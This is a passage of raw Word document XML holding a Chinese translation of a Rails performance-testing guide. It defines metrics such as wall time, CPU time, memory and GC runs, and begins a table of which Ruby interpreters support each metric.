        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="39004ACA" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B18FF1F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="176967486"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake test:profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B41EB0B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.4 指标（Metrics）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE2DFAA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>性能测试会得到多组指标，每个指标的产生都取决于计算机的硬件，模式以及解释器的使用————这意味着你需要综合的看待他们。应该尽量对每一组数据都做出一个简短描述并记录下当前运行的环境。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAB27FE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.1 真实时间（Wall Time）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2A0DB3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Wall Time 记录了你在跑测试的时候花了多少时间，这个时间会被计算机系统上的其他进程影响。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215C3803" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.2 处理时间（Process Time）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DD9677" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Process Time 记录了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 花在单个进程上的时间，这个数据并不会被同系统上的其他进程所影响。也正是因此，Process Time 通常对于同一个性能测试来说会是一个常数————如果忽略机器的载入时间的话。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E24917" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.3 CPU时间（CPU Time）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281AECD8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">与 process time 相似, 但是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Time 运用了 更加精准的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时钟计数器，该功能只在奔腾和 PowerPC 平台上有效.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFCED1E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.4 用户时间（User Time）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212158CA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>User Time 计算了CPU花在_用户态_下的时间总和。它不会被其他处理器所影响，但是可能会被 “阻止”（blocked）的状态影响。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1757FC66" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">TIP： 译者注： </w:t>
      </w:r>
      <w:hyperlink r:id="rId824" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>用户态</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> mode）在计算机结构指两项类似的概念。在CPU的设计中，用户态指非特权状态。在此状态下，执行的代码被硬件限定，不能进行某些操作，比如写入其他进 程的存储空间，以防止给操作系统带来安全隐患。在操作系统的设计中，用户态也类似，指非特权的执行状态。内核禁止此状态下的代码进行潜在危险的操作，比如 写入系统配置文件、杀掉其他用户的进程、重启系统等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257AA5AE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.5 内存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D32C8C5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>计算在性能测试用例中所占用的内存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504D0F1F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.6 对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374A0549" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>对象（Objects）计算了性能测试中被分配了的对象总数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB98003" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.7 GC 状态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4070B94C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>GC 状态 （GC Runs）计算了在性能测试中GC被调用的次数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F817A04" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.8 GC 时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6532CA63" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>GC Time 计算了在性能测试GC所花费的总时间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688B171F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.4.9 数据示例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B02F454" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.4.9.1 </w:t>
      </w:r>
      <w:r>
        <w:t>基准测试</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1"/>
        <w:gridCol w:w="937"/>
        <w:gridCol w:w="1201"/>
        <w:gridCol w:w="900"/>
        <w:gridCol w:w="941"/>
        <w:gridCol w:w="808"/>
        <w:gridCol w:w="719"/>
        <w:gridCol w:w="780"/>
        <w:gridCol w:w="800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="3E8E8A51" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B63FBDA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>解释器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45C1C305" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Wall Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35637527" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Process Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="439226F2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CPU</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58ECDA38" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>User Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="117C7B0D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F8959FE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Objects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="034E4EED" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>GC Runs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E369211" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>GC Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="03F282F5" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D5D24CE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>MRI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7959FBCD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C1DE92D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72872701" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45F05264" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F959814" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18F7F143" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AEF6171" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C7A1E8A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="4479FAA1" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="099696EC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>REE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71288BC3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B86A23D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="370AD54D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35A5CE54" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34E940D0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73682C4C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E785D69" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AA48472" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="54D0FD9D" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1690DDF0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Rubinius </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
